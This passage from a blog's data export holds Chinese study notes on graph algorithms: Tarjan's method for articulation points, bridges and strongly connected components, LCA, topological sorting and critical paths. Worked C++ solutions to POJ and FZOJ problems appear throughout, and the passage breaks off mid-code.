u为树根，且儿子个数大于1 u不为树根，但low[v]&gt;=dfn[u]（说明v及其子节点都不能达到u以上的父亲节点） 满足以上任意条件u便为割点，记录在数组里，tarjan完成后再输出（中途输出会重复） 用tarjan算法求割边（桥） 原理 发现T边(u,v)时若发现v和它的后代不存在一条连接u或其祖先的B边,则删除(u,v)后u和v不连通,因此(u,v)为桥 桥的判定算法 发现T边(u, v)时若low[v]&gt;=dfn[u],则(u,v)为桥 基本算法同tarjan经典算法 形参加上father，作用为记录u的父亲节点，避免在遍历v时遇到重边重新更新low[u] 在“v已被遍历”的位置加上判断 如果v点等于father，那么就不执行更新low[u]值 Tarjan算法结束后，遍历所有节点u及其子节点v，如果low[u]==low[v]，那么这条边就为割边 求点双连通分支(去掉割点之后所得的双连通分量) tarjan求割点 每找到一个割点，将它上面的所有点弹出栈，所得的点集就是双连通分量 求边双连通分支 tarjan找桥边 删除桥边（1、2两步同时完成） 剩余各部分则为双连通分量 有桥的连通图，加边变成双连通图 tarjan找桥边并删除桥边 将点双连通分量收缩成为一个顶点 加回桥边，统计度为1的顶点个数 根据规律，需要加入的桥边最少为(n+1)/2条 最近公共祖先LCA 原理：在一棵树中，父亲结点与儿子结点的最近公共祖先为父亲结点 建立并查集 DFS先序遍历一棵树 在每个结点上，进行以下操作： 涂黑该结点 如果有关于该结点a的询问，搜索另一询问的结点b，如果b也被涂黑，那么它们的公共祖先为b所在并查集的祖先，输出结果 拓展：求一棵树中两个结点的距离 建立dis[]数组，记录从树根到i点的距离dis[i] 则a与b的距离为 d=dis[a]-dis[LCA]+dis[b]-dis[LCA]=dis[a]+dis[b]-2*dis[LCA] Poj 1144 描述 一个电话线公司（简称TLC）正在建立一个新的电话线缆网络。他们连接了若干个地点分别从1到N编号。没有两个地点有相同的号码。这些线是双向的并且能使两个地点保持通讯。每个地点的线都终结于电话交换机。每个地点都有一个电话交换机。从每个地点都能通过线缆到达其他任意的地点，然而它并不需要直接连接，它可以通过若干个交换机来到达目的地。有时候某个地点供电出问题时，交换机就会停止工作。TLC的工作人员意识到，除非这个地点是不可达的，否则这种情况就会发生，它还会导致一些其它的地点不能互相通讯。在这种情况下我们会称这个地点（错误发生的地方）为critical。现在工作人员想要写一个程序找到所有critical地点的数量。帮帮他们。 输入 输入文件包括若组测试数据。每一组是一个网络，每一组测试数据的第一行是地点的总数量N&lt;100.每个接下来最多N行包括一个数字表示一个地点和与它相连接的地点的数字。这些最多N行完全描述了整个网络，比如，网络中每个直接连接的两个地点被至少一行包括。一行内的所有数字都要用空格隔开。每组数据需要用单独的一个0结束。最后的块只有一行即N=0。 输出 输出除了最后一个组其他每一个组的critical地点的数量，每个块用一行输出。 样例输入： 5 5 1 2 3 4 0 6 2 1 3 5 4 6 2 0 0 样例输出 1 2 提示： 你需要确定每行的结束。为了方便判断，每行的结束都没有多余的空白 读入是难点，其余就是找割点的部分 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;int first[120],go[10000],nxt[10000],arcnum=1;int dfn[120],low[120],idx;int stack[100000],top,ans[120];void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b;&#125;void tarjan(int u)&#123; low[u]=dfn[u]=++idx;// stack[++top]=u; int son=0; for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p]; if(dfn[v]==0)&#123; tarjan(v); son++; low[u]=min(low[u],low[v]); if((u==1&amp;&amp;son&gt;1)||(u!=1&amp;&amp;low[v]&gt;=dfn[u])) ans[u]++;//一定使用这种方法记录u是否为割点 // printf(\"u=%d son=%d ans=%d low[v]=%d dfn[u]=%d\\n\",u,son,ans,low[v],dfn[u]); &#125;else low[u]=min(low[u],dfn[v]); &#125;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,a,b; char c; while(scanf(\"%d\",&amp;n)!=EOF&amp;&amp;n!=0)&#123; memset(first,0,sizeof(first)); memset(dfn,0,sizeof(dfn)); memset(low,0,sizeof(low)); memset(ans,0,sizeof(ans)); arcnum=1; top=0; while(scanf(\"%d\",&amp;a)&amp;&amp;a!=0)&#123; do&#123; scanf(\"%d\",&amp;b); if(a==b) continue;//一定不考虑自环 addarc(a,b); addarc(b,a); c=getchar(); &#125;while(c!='\\n'); &#125; tarjan(1); int sum=0; for(int i=1;i&lt;=n;i++) if(ans[i]) sum++; printf(\"%d\\n\",sum); &#125; return 0;&#125; ​ ​ ​ **POJ1523 描述 考虑一下下图所示的两个网络。假设在这些网络中数据只能在两个直接连接的节点中传输。在左图网络中一个单独节点3的错误就会阻止一些其它可用节点的互相通信。节点1和2可以保持通信，4和5也是如此，但是其他的配对就无法再保持通信了。 因此3节点就是这个网络中的SinglePoint of Failure（SPF）。严格来讲，如果一个任意的不可用节点会阻止原有全通网络中至少一对可用节点保持通信，那么这就是一个SPF。注意在右图的网络中并没有这种节点。因此这个网络就没有SPF。至少有两台机器需要错误才能导致这个网络中有可用的节点对无法通信。 输入 输入会包括若干网络的描述。一个网络描述会包括若干对的整数，每行一对整数来描述节点的连接情况，先后顺序是无关的，如：1 2和2 1描述了相同的连接。所有的节点编码会从1到1000.一个单独的0行来结束连接节点的列表。一个空的网络描述结束输入。输入文档中空白的行要被忽略。 输出 对于每个输入的网络中，你需要输出存在的SPF节点的列表在文档中。 文档中第一个网络需要用“Network #1”来定义，第二个则是” Network #2”等等（如样例）。每个SPF节点，输出一行，方式如下方例子所示，列出节点的编号和当这个节点失效时完全连通的子网络的个数。如果网络中没有SPF节点，输出“NO SPF nodes“即可。 样例输入： 1 2 5 4 3 1 3 2 3 4 3 5 0 1 2 2 3 3 4 4 5 5 1 0 1 2 2 3 3 4 4 6 6 3 2 5 5 1 0 0 样例输出 Network #1 SPFnode 3 leaves 2 subnets Network #2 NoSPF nodes Network #3 SPFnode 2 leaves 2 subnets SPFnode 3 leaves 2 subnets 读入是难点，接下来是找割点，删除割点并且DFS找点双连通分量 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;int first[1200],go[10000],nxt[10000],arcnum=1;int dfn[1200],low[1200],exist[1200],rt,idx,ans[1200];int cut,vis[1200];void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b;&#125;void tarjan(int u)&#123; low[u]=dfn[u]=++idx; int son=0,v; for(int p=first[u];p!=0;p=nxt[p])&#123; v=go[p]; if(dfn[v]==0)&#123; tarjan(v); son++; low[u]=min(low[u],low[v]); if((u==rt&amp;&amp;son&gt;1)||(u!=rt&amp;&amp;low[v]&gt;=dfn[u])) ans[u]=1; &#125;else low[u]=min(low[u],dfn[v]); &#125;&#125;void dfs(int u)&#123;//DFS找相连子网络 if(vis[u]) return; vis[u]=1; for(int p=first[u];p!=0;p=nxt[p]) if(go[p]!=cut) dfs(go[p]);&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int a,b,k=0,cnt; while(scanf(\"%d\",&amp;a))&#123; if(a==0) break; k++; memset(first,0,sizeof(first)); memset(dfn,0,sizeof(dfn)); memset(low,0,sizeof(low)); memset(exist,0,sizeof(exist)); memset(ans,0,sizeof(ans)); arcnum=1; idx=0; cnt=0; do&#123; scanf(\"%d\",&amp;b); exist[a]=exist[b]=1; if(a==b) continue;//忽略自环 addarc(a,b); addarc(b,a); &#125;while(scanf(\"%d\",&amp;a)&amp;&amp;a!=0); rt=b; tarjan(rt); if(k&gt;1) printf(\"\\n\"); printf(\"Network #%d\\n\",k); for(cut=1;cut&lt;=1000;cut++) if(exist[cut]&amp;&amp;ans[cut])&#123; int sum=0; memset(vis,0,sizeof(vis)); for(int i=1;i&lt;=1000;i++) if(exist[i]&amp;&amp;!vis[i]&amp;&amp;!ans[i])//一定不能遍历割点本身 dfs(i),sum++; printf(\" SPF node %d leaves %d subnets\\n\",cut,sum); cnt++; &#125; if(cnt==0) printf(\" No SPF nodes\\n\"); &#125; return 0;&#125; POJ3177 描述 为了从F（1≤F≤5000）个牧场（从1到F进行编号）中的一个到达另一个牧场，Bessie和他的牛只能穿过烂苹果林。这些牛现在都累了，不想老走这个特殊的小路而是想要建一些新的小路，这样它们就有至少两种选择在任意牧场之间穿梭。在任意的两个牧场之间，它们现在至少有一条路径而他们想要至少有2条路径。 现在给出建好的R（F-1≤R≤10000）条路，每条都连接了两个不同的牧场，确定新修道路的最小数量（每个也是连接两个牧场）使得任意两个牧场之间都能有两条路连通。道路都是不同的，不会有相同的小路，即使他们在沿路的中间会碰到相同的牧场。 这里可能已经有一对牧场有超过一条小路的，并且你可能也会修一条新的另外的小路来连接相同的牧场。 输入 第一行：两个空格隔开的整数：F和R 第二到第R+1行：每行包括两个空格隔开的整数，表示一些小路端点所在的牧场。 输出 第一行：一个单独的整数，表述新修小道的数量 样例输入 7 7 1 2 2 3 3 4 2 5 4 5 5 6 5 7 样例输出 2 提示 例子的解释： 一个形象化的小路： 1 2 3 +—+—+ | | | | 6 +—+—+ 4 / 5 / / 7 + 建一个从1到6和从4到7的新路可以满足条件。 1 2 3 +---+---+ : | | : | | 6 +---+---+ 4 / 5 : / : / : 7 + - - - - 检查一些路径： 1 – 2: 1 –&gt; 2 and 1 –&gt; 6 –&gt; 5 –&gt; 2 1 – 4: 1 –&gt; 2 –&gt; 3 –&gt; 4 and 1 –&gt; 6 –&gt; 5 –&gt; 4 3 – 7: 3 –&gt; 4 –&gt; 7 and 3 –&gt; 2 –&gt; 5 –&gt; 7 可以看出每对牧场都是由两条路连接的 有可能加一些别的下路也能解决这个问题（比如6到7加一条道）。然而加两条已经是最小了。 POJ3352 描述： 夏天的建造时间到了。这一年，遥远热带小岛上的街道的管理员要修复并且升级岛上街道，这些街道连接了小岛上不同的景点。 这些街道很有意思。由于这个小岛的奇怪传统，这些街道需要被规划的没有任何十字路口，但是可以用桥和隧道来连通。在这种情况下，每条路就会在特定的景点之间连接，这样旅客就不会迷路了。 不幸的是，每条路都需要修理和升级，当建筑公司在一条特定的道路上工作时，这条道路是无法使用的。这就会导致一个问题，即使这个公司一次只修一条路，仍然有两个景点是无法访问的，。 所以，这个岛上的道路部门就决定召唤你的咨询服务来帮助他们解决这个问题。最后决定在景点之间建设新的道路。如果一条道路在建设中，这些新的道路能使任意两个景点之间仍然有路能够到达。你的任务就是找到这个新修道路的最小数量。 输入 第一行的输入包括两个正整数n和r，其中3≤n≤1000是景点的数量，2≤r≤1000是道路的数量。景点则是从1到n进行标号。每个接下来的r行会包括两个整数，v和w，中间空格隔开，表示一个街道连接了标号为v和w的景点。注意街道是双向的，并且任意一对景点之间会有至多一条路直接连接它们。当然，你也要保证在现在的这个配置下，任意两个景点是连通的。 输出 一行，包括一个整数，给出我们需要添加的街道的最小数量 输入样例 Sample Input 1 10 12 1 2 1 3 1 4 2 5 2 6 5 6 3 7 3 8 7 8 4 9 4 10 9 10 Sample Input 2 3 3 1 2 2 3 1 3 输出样例 Output for Sample Input 1 2 Output for Sample Input 2 0 两道题完全相同，都是求有桥连通图变为双连通图所需要最少的边的个数 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAXN=5000+20;const int MAXM=10000+20;int first[MAXN],go[MAXM],nxt[MAXM],arcnum=1;int low[MAXN],dfn[MAXN],dex,cnt[MAXN],map[MAXN][MAXN],sum;void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b;&#125;void tarjan(int u,int father)&#123; low[u]=dfn[u]=++dex; for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p]; if(!dfn[v])&#123; tarjan(v,u); low[u]=min(low[u],low[v]); &#125;else if(v!=father) low[u]=min(low[u],dfn[v]);//如果引出v，而v是u的父亲，那么就不能更新low[u] &#125;&#125;int main()&#123; int n,m,a,b; while(scanf(\"%d%d\",&amp;n,&amp;m)!=EOF)&#123; for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d\",&amp;a,&amp;b); if(a==b) continue; if(map[min(a,b)][max(a,b)]) continue; map[min(a,b)][max(a,b)]=1; addarc(a,b); addarc(b,a); &#125; tarjan(1,-1); for(int u=1;u&lt;=n;u++) for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p]; if(low[u]!=low[v]) cnt[low[u]]++;//计算度数 &#125; for(int i=1;i&lt;=n;i++) if(cnt[i]==1) sum++;//统计度为1的点的个数 printf(\"%d\",(sum+1)/2); &#125; return 0;&#125; ​ ​","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"Tarjan算法求强连通分量总结","slug":"tarjan-e7-ae-97-e6-b3-95-e6-b1-82-e5-bc-ba-e8-bf-9e-e9-80-9a-e5-88-86-e9-87-8f-e6-80-bb-e7-bb-93","date":"2018-12-06T15:42:41.000Z","updated":"2019-05-05T05:39:32.347Z","comments":true,"path":"posts/874d0da0/","link":"","permalink":"https://mrh1s.top/posts/874d0da0/","excerpt":"","text":"Tarjan算法求强连通分量总结 首先明确强连通分量的概念：如果图中的任意两个点都能互相到达，则为强连通分量。极大强连通分量：不被其它任何强连通分量包含的强连通分量。 强连通分量主要与两种边有关：交叉边和后向边。 交叉边是两个无关系的点之间所构成的，而后向边是根节点的子节点指向根结点的一种边 Tarjan算法原理： 建立low数组（用于记录该点所在的连通子图的根节点的搜索子树所遍历的时间）与dfn数组（记录当前点遍历的时间）Index：记录搜索过程所进行的时间 初始化dfn、index，当前点u的初始值为时间 u入栈并标记 遍历与u相连的所有点（记为v） 如果v未被遍历，递归遍历v点，然后更新low[u] low[u]=min(low[u],low[v]); 如果 v已经被遍历且在栈中直接更新low[u] low[u]=min(low[u],dfn[v]); 判断low[u]==low[v]如果成立，将包括u在内的所有点出栈并记录，则求得强连通分量之一 继续遍历，直至结束 注意：在一个图中，起点不唯一，所以tarjan算法应该遍历所有未被遍历的点(vis[i]==0) 本算法主要应用范围是对复杂的有向图的缩点优化。如果某些点构成一个环，完全可以把它们看作一个点，加快程序运行效率 Question:如果是有向有权图使用缩点时应该怎么处理权值的问题？ FZOJ1638求强连通分量 描述 输入一个图，输出该图中的最大强连通分量。 输入 第一行：n和m（n&lt;=10000,m&lt;=100000,n为节点个数，m为边的条数） 接下来m行，每行两个数：a，b，表示a指向b的边（a,b为非负整数）； 输出 输出最大强连通分量的节点，按照节点编号从小到大输出，如果有多个强连通分量节点数相同，则输出节点编号字典序较小的。 样例输入 6 8 1 3 3 5 5 6 1 2 4 1 2 4 4 6 3 4 样例输出 1 2 3 4 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;int first[10020],nxt[100200],go[100200],arcnum=1;int dfn[10020],low[10020],stack[100200],top,dex,vis[10020];int rt,ans[10020],temp[10020],sum;void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b;&#125;void tarjan(int u)&#123; dfn[u]=low[u]=++dex; stack[++top]=u; vis[u]=1; for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p]; if(vis[v]==0)&#123; vis[v]=1; tarjan(v); low[u]=min(low[u],low[v]); &#125; else if(vis[v]==1) low[u]=min(low[u],dfn[v]); &#125; if(dfn[u]==low[u]) &#123; int v; sum=0; do&#123; v=stack[top--]; vis[v]=2; temp[++sum]=v; &#125;while(u!=v); if(rt&lt;sum)&#123; rt=sum; for(int i=1;i&lt;=sum;i++) ans[i]=temp[i]; &#125; &#125;&#125; int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m,a,b; scanf(\"%d%d\",&amp;n,&amp;m); for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d\",&amp;a,&amp;b); addarc(a,b); &#125; for(int i=0;i&lt;=n-1;i++) if(vis[i]==0)&#123; top=0;dex=0; memset(dfn,0,sizeof(dfn)); memset(low,0,sizeof(low)); stack[++top]=i; tarjan(i); &#125; sort(ans+1,ans+1+rt); for(int i=1;i&lt;=rt;i++) printf(\"%d \",ans[i]); return 0;&#125; **Poj2186Popular Cows Description Every cow’s dream is to become the mostpopular cow in the herd. In a herd of N (1 &lt;= N &lt;= 10,000) cows, you aregiven up to M (1 &lt;= M &lt;= 50,000) ordered pairs of the form (A, B) thattell you that cow A thinks that cow B is popular. Since popularity is transitive,if A thinks B is popular and B thinks C is popular, then A will also think thatC is popular, even if this is not explicitlyspecified by an ordered pair in the input. Your task is to compute the numberof cows that are considered popular by every other cow. Input * Line 1: Two space-separated integers, Nand M * Lines 2..1+M: Two space-separated numbersA and B, meaning that A thinks B is popular. Output output * Line 1: A single integer that is thenumber of cows who are considered popular by every other cow. Sample Input 3 3 1 2 2 1 2 3 Sample Output 1 Hint Cow 3 is the only cow of high popularity. 题目大意 N头奶牛(N≤10000) M对关系（a , b），表示a认为b是受欢迎的 关系具有传递性，即若(a,b),(b,c)→(a,c) 询问有多少头奶牛是被其他所有奶牛认为是受欢迎的 这道题据说不使用强连通算法优化也能做出来，就是说tarjan算法只是进行优化。 进过分析可以发现，在有向无环图DAG图中，要想一头（群）牛被其它所有牛欢迎，必须满足只有它自己的出度为0，其它的牛所构成的圈子（环）的出度必须大于零才可以 这样就得到了解决方法，用tarjan算法算出所有的强连通分量并将它们合并成一个点，再做一次搜索，如果这个环对外的出度为0则其中所有牛对其他牛的出度都为0 如果一个DAG图有两个以上出度为0得点，那么总有一个点无法到达其它任意一个点 遍历所有环与点，如果出度为0的只有一个则输出答案，否则答案为0 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAXN=10000+200,MAXM=50000+200;int first[MAXN],nxt[MAXM],go[MAXM],arcnum=1;int dfn[MAXN],low[MAXN],stack[MAXM],top;int scc[MAXN],idx,cscc,vis[MAXN];//记录强连通分量 int cd[MAXN],cd_scc[MAXN];void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b; cd[a]++;&#125;void tarjan(int u)&#123; low[u]=dfn[u]=++idx; stack[++top]=u; vis[u]=1; for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p]; if(vis[v]==0)&#123; tarjan(v); low[u]=min(low[u],low[v]); &#125;else if(vis[v]==1) low[u]=min(low[u],dfn[v]); &#125; if(dfn[u]==low[u])&#123; int v; cscc++; do&#123; v=stack[top--]; vis[v]=2; scc[v]=cscc; &#125;while(u!=v); &#125;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m,a,b; scanf(\"%d%d\",&amp;n,&amp;m); for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d\",&amp;a,&amp;b); addarc(a,b); &#125; for(int i=1;i&lt;=n;i++) if(vis[i]==0) tarjan(i); if(idx&lt;n)&#123; printf(\"0\"); return 0; &#125; for(int u=1;u&lt;=n;u++) for(int p=first[u];p!=0;p=nxt[p])&#123; int v=go[p]; if(scc[u]!=scc[v]) cd_scc[scc[u]]++; &#125; int c1=0; for(int i=1;i&lt;=cscc;i++)&#123; if(cd_scc[i]==0&amp;&amp;c1==0) c1=i; else if(c1!=0&amp;&amp;cd_scc[i]==0)&#123; printf(\"0\"); return 0; &#125; &#125; int ans=0; for(int i=1;i&lt;=n;i++) if(scc[i]==c1) ans++; printf(\"%d\",ans); return 0;&#125;","categories":[{"name":"c_plus_plus_2016","slug":"c-plus-plus-2016","permalink":"https://mrh1s.top/categories/c-plus-plus-2016/"}],"tags":[]},{"title":"拓扑排序以及关键路径总结","slug":"e6-8b-93-e6-89-91-e6-8e-92-e5-ba-8f-e4-bb-a5-e5-8f-8a-e5-85-b3-e9-94-ae-e8-b7-af-e5-be-84-e6-80-bb-e7-bb-93","date":"2018-12-06T15:42:05.000Z","updated":"2019-05-05T05:18:07.140Z","comments":true,"path":"posts/28cf1e0f/","link":"","permalink":"https://mrh1s.top/posts/28cf1e0f/","excerpt":"","text":"拓扑排序以及关键路径的总结 拓扑排序：首先纠正一个读音问题：拓扑(tuopu)话说我好几次都读成(tabu) (tuobu)好吗！ ​ 拓扑排序是针对AOV图（即有向无边图，且图中不允许环的存在）的一种排序算法，它用于将一个AOV图按照顺序排成线性序列 ​ 基本操作如下： 1.记录每个节点的入度 2.每次找到入度为零的点入栈，并将与之相连的节点入度减一 3.重复2的动作，直到栈为空 4.判断当前操作进行的次数，少于n次则有环，否则输出拓扑序列 家谱树 【问题描述】 有个人的家族很大，辈分关系很混乱，请你帮整理一下这种关系。 给出每个人的孩子的信息。 输出一个序列，使得每个人的后辈都比那个人后列出。 【输入格式】 第1行一个整数N（1&lt;=N&lt;=100），表示家族的人数。 接下来N行，第I行描述第I个人的儿子。 每行最后是0表示描述完毕。 【输出格式】 输出一个序列，使得每个人的后辈都比那个人后列出。 如果有多解输出任意一解。 【输入样例】 5 0 4 5 1 0 1 0 5 3 0 3 0 【输出样例】 2 4 5 3 1 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=10000;int first[MAX],nxt[MAX],go[MAX],arcnum=1;int rd[MAX],stack[MAX],top;void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m; scanf(\"%d\",&amp;n); for(int i=1;i&lt;=n;i++) while(scanf(\"%d\",&amp;m)!=EOF &amp;&amp;m!=0) addarc(i,m),rd[m]++; for(int i=1;i&lt;=n;i++) if(rd[i]==0) stack[++top]=i; do&#123; int now=stack[top--]; printf(\"%d \",now); for(int p=first[now];p!=0;p=nxt[p])&#123; rd[go[p]]--; if(rd[go[p]]==0) stack[++top]=go[p]; &#125; &#125;while(top!=0); ​ ​ return 0;​ } 该题是明显的拓扑排序题，按照标准格式写程序即可 奖金 （http://fzoj.xndxfz.com/JudgeOnline/problem.php?id=1624） 描述 由于无敌的凡凡在2005年世界英俊帅气男总决选中胜出，Yali Company总经理Mr.Z心情好，决定给每位员工发奖金。公司决定以每个人本年在公司的贡献为标准来计算他们得到奖金的多少。于是Mr.Z下令召开m方会谈。每位参加会谈的代表提出了自己的意见：“我认为员工a的奖金应该比b高！”Mr.Z决定要找出一种奖金方案，满足各位代表的意见，且同时使得总奖金数最少。每位员工奖金最少为100元。 输入 第一行两个整数n,m，表示员工总数和代表数；以下m行，每行2个整数a,b，表示某个代表认为第a号员工奖金应该比第b号员工高。 输出 若无法找到合理方案，则输出“Poor Xed”；否则输出一个数表示最少总奖金。 样例输入 2 1 1 2 样例输出 201 提示 80％的数据满足n&lt;=1000，m&lt;=2000；100％的数据满足n&lt;=10000，m&lt;=20000。 此题比上一题多加入了点的权值 也就是计算拓扑序列中权值和最小是多少 标准做法：使用拓扑排序，在去掉某个点后，遍历它的相连节点时，计算该点的权值，是在(val[v],val[u]+1),其中u为起点，v为中点，中取最大值，开始我的理解出现的偏差，不能在那个点入度为0的时候才计算那个点的权值，因为那个点要满足的条件是比它之前的所有点权值都要小 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=300000;int first[MAX],nxt[MAX],go[MAX],arcnum=1,rd[MAX];int stack[MAX],val[MAX],top;void addarc(int a,int b)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m,a,b,k=0,tot=0; scanf(\"%d%d\",&amp;n,&amp;m); for(int i=1;i&lt;=m;i++)&#123; scanf(\"%d%d\",&amp;a,&amp;b); addarc(b,a);//b比a工资低 rd[a]++;//入度+1 &#125; for(int i=1;i&lt;=n;i++) if(rd[i]==0)//将入度为0的点入栈 stack[++top]=i; while(top!=0)&#123; int now=stack[top--];//当前点 k++; tot+=100+val[now]; for(int p=first[now];p!=0;p=nxt[p])&#123; val[go[p]]=max(val[go[p]],val[now]+1);//不应当在入度为0时才更新val[]，而应当每次都更新，取最大值 if(--rd[go[p]]==0) stack[++top]=go[p]; &#125; &#125; if(k==n) printf(\"%d\",tot); else printf(\"Poor Xed\"); return 0; &#125; ​ ​ fzoj1621:烦人的幻灯片 题目描述 李教授于今天下午做一个非常重要的演讲。不幸的是他不是一个非常爱整洁的人，他把自己做演讲要用的幻灯片随便堆放在一起。因此，演讲之前他不得不去整理这些幻灯片。做为一个讲求效率的学者，他希望尽可能简单地完成它。情况是这样，教授这次演讲一共要用n张幻灯片（n&lt;=26），这n张幻灯片按照演讲要使用的顺序已经用数字1，2，…，n在上面编上了号。因为幻灯片是透明的，所以我们不能一下子看清每一个数字所对应的幻灯片。 现在我们用大写字母A，B，C，。。。再次把幻灯片依次编号。你的任务是编写一个程序，把幻灯片的数字编号和字母编号对应起来，显然这种对应应该是唯一的；若出现多种对应的情况或是某些数字编号和字母对应不起来，我们就称对应是无法实现的。 输入 第一行：只有一个数n，表示有n张幻灯片。 接下来的n行：包括4个整数Xmin，Xmax，Ymin，Ymax（整数之间用空格分开），为幻灯片的坐标（该区域为幻灯片），这n张幻灯片按其在输入文件中出现的顺序从前到后依次编号为A，B，C，…再接下来的n行依次为n个数字编号的坐标X，Y，显然在幻灯片之外是不会有数字的。 输出 若是对应可以实现，你的输出应该包括n行，每一行为一个字母和一个数字，中间以一个空格隔开，并且各行以字母的升序排列，注意输出的字母要大写并且顶格；反之，若是对应无法实现，在第一行顶格输出None即可。行首行末无多余空格。 样例输入 4 6 22 10 20 4 18 6 16 8 20 2 18 10 24 4 8 9 15 19 17 11 7 21 11 样例输出 A 4 B 1 C 2 D 3 这道题并不完全是拓扑排序题，但却用到了拓扑排序的思想 读懂题意是关键，本题意思是每个数字都对应了一个或多个幻灯片，然后要求从中找出数字与幻灯片的一一对应关系 节点个数很少，直接用邻接矩阵存储 由于是数字对应幻灯片，所以我选择存储每个数字的出度，当某个数字出度为1时，寻找它所对应的幻灯片，记录，并且将与该幻灯片连接的其余数字全部断绝联系，出度也减1 这样，n次之后就可以得到完整的一一对应关系 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=1000;int X1[MAX],X2[MAX],Y1[MAX],Y2[MAX],map[MAX][MAX],cd[MAX],ans[MAX];int stack[MAX],top;bool IsInside(int x,int y,int t)&#123;//第t张输入的幻灯片 return x&gt;X1[t]&amp;&amp;x&lt;X2[t]&amp;&amp;y&gt;Y1[t]&amp;&amp;y&lt;Y2[t];&#125; int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,x,y,k=0; scanf(\"%d\",&amp;n); for(int i=1;i&lt;=n;i++) scanf(\"%d%d%d%d\",&amp;X1[i],&amp;X2[i],&amp;Y1[i],&amp;Y2[i]); for(int i=1;i&lt;=n;i++)&#123; scanf(\"%d%d\",&amp;x,&amp;y); for(int j=1;j&lt;=n;j++) if(IsInside(x,y,j)) map[i][j]=1,cd[i]++;//第i个数字在j-'A'+1的幻灯片中 &#125; for(int i=1;i&lt;=n;i++) if(cd[i]==1) stack[++top]=i; do&#123; int u=stack[top--]; k++; for(int v=1;v&lt;=n;v++) if(map[u][v]==1)&#123;//如果u到v有路径 则u属于v ans[v]=u; for(int i=1;i&lt;=n;i++) if(map[i][v]==1)&#123; map[i][v]=0; cd[i]--; if(cd[i]==1) stack[++top]=i; &#125; break; &#125; &#125;while(top!=0); if(k!=n) printf(\"None\"); else for(int i=1;i&lt;=n;i++) printf(\"%c %d\\n\",'A'+i-1,ans[i]); return 0;&#125; 关键路径： 建立在一种新图上：AOV图（用点表示时间，边表示活动，边的权值表示活动持续的时间的一种图） 四个重要的量 事件最早发生时间ve[] 事件最晚发生时间vl[] 活动最早开始时间e[] 活动最晚开始时间l[] 各个量的求法及求解顺序： Ve，以Ve[1]=0开始，所有起点u终点v都按照ve[v]=max(ve[v],ve[u]+dis[u][v])的方法进行计算，并且记录下拓扑序列 Vl，顺序：逆拓扑序列，以Vl[n]=Ve[n]开始，（因为终点是关键事件，所以最早和最晚开始时间相等）起点u终点v都按照vl[v]=min(vl[v],vl[u]-dis[u][v])的方法求解（此处注意，程序开头必须memset） e，事件的最早发生时间就等于活动的最早开始时间 l，对于起点x终点y之间的活动i，l[i]=vl[y]-dis[x][y] 如果e[i]==l[i]则说它是关键活动 结束。 Question：活动的最早最晚开始时间和事件的最早最晚发生时间有什么关系，它们各自属于实际问题中的那一个量？（我只会求，但并不能完全明白它们的差别或者用途） 前面奖金一题所用的方法是不是关键路径中的求事件最早发生时间？ 关键路径计算（http://fz.openjudge.cn/graph/015/） 描述 给出一个AOE图，请输出其关键路径； 输入 第一行：n，m（n,m&lt;=100分别表示节点个数与边的条数） 接下来m行，第i+1行，表示第i条边，每行三个数：ai,bi,ci，表示存在一条ai指向bi权值为ci的边。 注意：起点为结点1，终点为结点n 输出 将关键路径的边的编号从小到大输出 样例输入 9 11 1 2 6 1 3 4 1 4 5 2 5 1 3 5 1 4 6 2 5 7 9 5 8 7 6 8 4 7 9 2 8 9 4 样例输出 1 4 7 8 10 11 标准问题，注意在输出之前要排序 #include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;using namespace std;const int MAX=1000;int first[MAX],go[MAX],nxt[MAX],dis[MAX][MAX],arcnum=1;int stack[MAX],top,ve[MAX],vl[MAX],e[MAX],l[MAX],rd[MAX];int order[MAX],ans[MAX],sum;void addarc(int a,int b,int c)&#123; nxt[arcnum]=first[a]; first[a]=arcnum; go[arcnum++]=b; dis[a][b]=c;&#125;int main()&#123;// freopen(\"in.txt\",\"r\",stdin); int n,m,a,b,c,k=0; scanf(\"%d%d\",&amp;n,&amp;m); memset(vl,127,sizeof(vl)); for(int i=1;i&lt;=m;i++)&#123; 